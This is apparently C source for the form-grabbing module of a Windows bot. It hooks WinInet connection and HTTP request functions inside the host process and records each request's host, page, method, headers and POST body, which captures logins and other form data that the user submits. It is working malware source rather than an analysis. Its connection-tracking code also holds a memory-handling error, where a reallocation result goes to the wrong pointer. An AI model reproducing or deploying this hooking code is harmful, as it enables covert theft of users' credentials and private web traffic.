#include "wininet.h"
#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#include <WinInet.h>

#include "..\common\mem.h"
#include "..\common\string.h"
#include "..\common\hooking.h"

ptHttpSendRequestA oHttpSendRequestA;
ptHttpSendRequestW oHttpSendRequestW;

ptHttpOpenRequestA oHttpOpenRequestA;
ptHttpOpenRequestW oHttpOpenRequestW;

ptInternetConnectA oInternetConnectA;
ptInternetConnectW oInternetConnectW;

ptInternetReadFile oInternetReadFile;
ptInternetCloseHandle oInternetCloseHandle;

extern bot_t bot;

static RTL_CRITICAL_SECTION csWininet;
static DWORD wininetConnectionCount;
static wininet_request_t* wininetRequests;

static DWORD findConnection(HINTERNET hConnect)
{
	DWORD i;

	for(i = 0; i < wininetConnectionCount; i++)
	{
		if(wininetRequests[i].hConnect == hConnect)
			return i;
	}

	return -1;
}

static DWORD findConnectionByRequest(HINTERNET hRequest)
{
	DWORD i;

	for(i = 0; i < wininetConnectionCount; i++)
	{
		if(wininetRequests[i].hRequest == hRequest)
			return i;
	}

	return -1;
}

static void addConnection(HINTERNET hConnect, const LPSTR Host)
{
	wininet_request_t* pRequest;
	DWORD i, dwIndex;

	dwIndex = -1;
	pRequest = NULL;

	CWA(RtlEnterCriticalSection)(&csWininet);

	for(i = 0; i < wininetConnectionCount; i++)
	{
		if(wininetRequests[i].hConnect == INVALID_HANDLE_VALUE)
		{
			pRequest = &wininetRequests[i];
			dwIndex = i;
			break;
		}
	}

	if(pRequest == NULL && memreallocEx(&pRequest, sizeof(wininet_request_t) * (wininetConnectionCount + 1)))
	{
		dwIndex = wininetConnectionCount++;
		pRequest = &wininetRequests[i];
	}

	if(pRequest != NULL)
	{
		memzero(pRequest, sizeof(wininet_request_t));
		pRequest->hConnect = hConnect;
		pRequest->Host = StrCopyA(Host, StrLengthA(Host));
	}

	CWA(RtlLeaveCriticalSection)(&csWininet);
}

static void removeConnection(HINTERNET hInternet)
{
	wininet_request_t* pRequest;
	DWORD dwNewCount, dwIndex;

	CWA(RtlEnterCriticalSection)(&csWininet);

	if((dwIndex = findConnection(hInternet)) == -1)
		dwIndex = findConnectionByRequest(hInternet);

	if(dwIndex != -1)
	{
		pRequest = &wininetRequests[dwIndex];
		
		if(pRequest->Host != NULL)
			memfree(pRequest->Host);

		if(pRequest->Page != NULL)
			memfree(pRequest->Page);

		if(pRequest->Method != NULL)
			memfree(pRequest->Method);

		memzero(pRequest, sizeof(wininet_request_t));

		dwNewCount = wininetConnectionCount;

		while(dwNewCount > 0 && wininetRequests[dwNewCount - 1].hConnect == 0) dwNewCount--;

		if(dwNewCount != wininetConnectionCount)
		{
			if(dwNewCount == 0)
			{
				memfree(wininetRequests);
				wininetRequests = NULL;
			}
			else memreallocEx(&wininetRequests, sizeof(wininet_request_t) * dwNewCount);

			wininetConnectionCount = dwNewCount;
		}
	}

	CWA(RtlLeaveCriticalSection)(&csWininet);
}

void setPageMethod(HINTERNET hConnect, const LPSTR Page, const LPSTR Method)
{
	wininet_request_t* pRequest;
	DWORD dwIndex;

	CWA(RtlEnterCriticalSection)(&csWininet);

	if((dwIndex = findConnection(hConnect)) != -1)
	{
		if((pRequest = &wininetRequests[dwIndex]) != NULL)
		{
			pRequest->Page = StrCopyA(Page, StrLengthA(Page));
			pRequest->Method = StrCopyA(Method, StrLengthA(Method));
		}
	}

	CWA(RtlLeaveCriticalSection)(&csWininet);
}

void setRequestHandle(HINTERNET hConnect, HINTERNET hRequest)
{
	wininet_request_t* pRequest;
	DWORD dwIndex;

	CWA(RtlEnterCriticalSection)(&csWininet);

	if((dwIndex = findConnection(hConnect)) != -1)
	{
		if((pRequest = &wininetRequests[dwIndex]) != NULL)
			pRequest->hRequest = hRequest;
	}

	CWA(RtlLeaveCriticalSection)(&csWininet);
}

BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest,LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,DWORD dwOptionalLength)
{
	wininet_request_t* pRequest;
	DWORD dwIndex, dwRequestHeadersLength;

	if(lpszHeaders == NULL || lpOptional == NULL)
		goto finish_request;

	CWA(RtlEnterCriticalSection)(&csWininet);

	if((dwIndex = findConnectionByRequest(hRequest)) != -1)
	{
		if((pRequest = &wininetRequests[dwIndex]) != NULL)
		{
			if((dwRequestHeadersLength = dwHeadersLength) == -1)
				dwRequestHeadersLength = StrLengthW(lpszHeaders);

			pRequest->Header = unicodeToAnsiEx(lpszHeaders, dwRequestHeadersLength);
			pRequest->Data = ToStringA(lpOptional, dwOptionalLength);


		}
	}
	CWA(RtlLeaveCriticalSection)(&csWininet);

finish_request:
	return oHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

BOOL WINAPI HttpSendRequestA_Hooked( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	wininet_request_t* pRequest;
	DWORD dwIndex, dwRequestHeadersLength;

	if(lpszHeaders == NULL || lpOptional == NULL)
		goto finish_request;

	CWA(RtlEnterCriticalSection)(&csWininet);

	if((dwIndex = findConnectionByRequest(hRequest)) != -1)
	{
		if((pRequest = &wininetRequests[dwIndex]) != NULL)
		{
			if((dwRequestHeadersLength = dwHeadersLength) == -1)
				dwRequestHeadersLength = StrLengthA(lpszHeaders);

			pRequest->Header = StrCopyA(lpszHeaders, dwRequestHeadersLength);
			pRequest->Data = ToStringA(lpOptional, dwOptionalLength);
		}
	}

	CWA(RtlLeaveCriticalSection)(&csWininet);

finish_request:
	return oHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

HINTERNET WINAPI HttpOpenRequestA_Hooked(HINTERNET hConnect,LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer,LPCSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
	HINTERNET hRequest;

	setPageMethod(hConnect, lpszObjectName, lpszVerb);

	hRequest = oHttpOpenRequestA(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);

	setRequestHandle(hConnect, hRequest);

	return hRequest;
}

HINTERNET WINAPI HttpOpenRequestW_Hooked(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
	LPSTR Page, Method;
	BOOL bIsOk;
	HINTERNET hRequest;

	bIsOk = FALSE;

	if((Page = unicodeToAnsiEx(lpszObjectName, StrLengthW(lpszObjectName))) != NULL)
	{
		if((Method = unicodeToAnsiEx(lpszVerb, StrLengthW(lpszVerb))) != NULL)
		{
			setPageMethod(hConnect, Page, Method);
			bIsOk = TRUE;
			memfree(Method);
		}

		memfree(Page);
	}

	hRequest = oHttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);

	if(bIsOk) setRequestHandle(hConnect, hRequest);

	return hRequest;
}

HINTERNET WINAPI InternetConnectW_Hooked(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
	HINTERNET hConnect;
	LPSTR Host;

	if((hConnect = oInternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext)) != 0)
	{
		if((Host = unicodeToAnsiEx(lpszServerName, StrLengthW(lpszServerName))) != NULL)
		{
			addConnection(hConnect, Host);
			memfree(Host);
		}
	}

	return hConnect;
}

HINTERNET WINAPI InternetConnectA_Hooked(HINTERNET hInternet,LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
{
	HANDLE hConnect;

	if((hConnect = oInternetConnectA(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext)) != 0)
	{
		addConnection(hConnect, lpszServerName);
	}

	return hConnect;
}

BOOL WINAPI InternetCloseHandle_Hooked(HINTERNET hInternet)
{
	removeConnection(hInternet);

	return oInternetCloseHandle(hInternet);
}

BOOL WINAPI IsWininet(HMODULE* phMod)
{
	HMODULE hMod;

	if ((hMod = bot.api.pGetModuleHandleW(L"wininet.dll")) != 0)
	{
		*phMod = hMod;

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI InstallWininetHooks(void)
{
	HMODULE hMod;
	unsigned int i;

	hook_t hooks[] =
	{
		{bot.api.pInternetConnectA, &InternetConnectA_Hooked, (LPVOID*)&oInternetConnectA, 0},
		{bot.api.pInternetConnectW, &InternetConnectW_Hooked, (LPVOID*)&oInternetConnectW, 0},
		{bot.api.pHttpOpenRequestA, &HttpOpenRequestA_Hooked, (LPVOID*)&oHttpOpenRequestA, 0},
		{bot.api.pHttpOpenRequestW, &HttpOpenRequestW_Hooked, (LPVOID*)&oHttpOpenRequestW, 0},
		{bot.api.pHttpSendRequestA, &HttpSendRequestA_Hooked, (LPVOID*)&oHttpSendRequestA, 0},
		{bot.api.pHttpSendRequestW, &HttpSendRequestW_Hooked, (LPVOID*)&oHttpSendRequestW, 0},
		{bot.api.pInternetCloseHandle, &InternetCloseHandle_Hooked, (LPVOID*)&oInternetCloseHandle, 0}
	};

	if (!IsWininet(&hMod))
		return FALSE;

	wininetRequests = NULL;
	wininetConnectionCount = 0;
	CWA(RtlInitializeCriticalSection)(&csWininet);


	for (i = 0; i < sizeof(hooks) / sizeof(hook_t); i++)
	{
		/*if((*hooks[i].lpOriginalFunction = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
			continue;

		if (!HookFunction(hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, *hooks[i].lpOriginalFunction, &hooks[i].dwLength))
			return FALSE;*/

		*hooks[i].lpOriginalFunction = HookRemoteFunctionEx(CURRENT_PROCESS, hooks[i].lpFunctionAddress, hooks[i].lpCallbackAddress, &hooks[i].dwLength);
	}

	return TRUE;
}
#endif